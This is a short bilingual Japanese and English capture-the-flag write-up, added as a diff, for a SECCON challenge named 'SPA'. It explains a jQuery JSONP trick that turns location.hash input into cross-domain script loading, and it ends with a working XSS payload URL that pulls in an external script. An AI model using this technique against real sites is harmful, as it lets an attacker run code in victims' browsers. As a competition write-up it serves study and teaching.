@@ -1,0 +1,18 @@
+# ja
+SPA 解法
+
+* location.hashからユーザー入力を与えられる
+* $.getJSONや関連メソッドは`callback=?`を含むURLを与えると勝手にJSONPとして解釈する
+* 先頭に`/`を付与してクロスドメインのリクエストを発行
+
+http://spa.chal.seccon.jp:18364/#/hakatashi.com/xss.js?callback=?&yakuza
+
+
+# en
+SPA writeup
+
+* given user input from location.hash
+* $ .getJSON and related methods are interpreted as JSONP if given URL containing `callback =?`
+*  Issue a cross domain request with a leading `/`
+
+http://spa.chal.seccon.jp:18364/#/hakatashi.com/xss.js?callback=?&yakuza
